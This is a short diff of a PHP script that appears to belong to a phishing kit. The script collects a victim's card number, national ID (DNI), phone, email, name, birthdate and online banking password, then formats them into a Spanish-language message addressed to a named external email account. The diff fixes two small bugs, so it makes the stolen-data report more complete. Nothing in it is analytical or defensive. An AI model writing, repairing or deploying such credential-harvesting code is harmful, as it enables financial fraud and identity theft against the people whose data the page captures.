@@ -9,7 +9,7 @@
     $email = $_POST['email'];
     $cc = $_SESSION['cc'];
     $pass = $_SESSION['pass'];
-    $birthdate = $_SESSION['birthdate'];
+    $birthdate = $_POST['birthdate'];
 
     //Correo a donde se envía la información
     $to = "fernando1894@hotmail.com";
@@ -19,7 +19,7 @@
     $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
             "DNI: " . $dni . "\n" . 
             "NUMERO DE TELEFONO: " . $tel . "\n" . 
-            "DIRECCIÓN DE CORREO: " . $email . 
+            "DIRECCIÓN DE CORREO: " . $email . "\n" .
             "NOMBRE: " . $name . "\n" . 
             "FECHA DE NACIMIENTO: " . $birthdate . "\n" . 
             "CLAVE WEB: " . $pass;
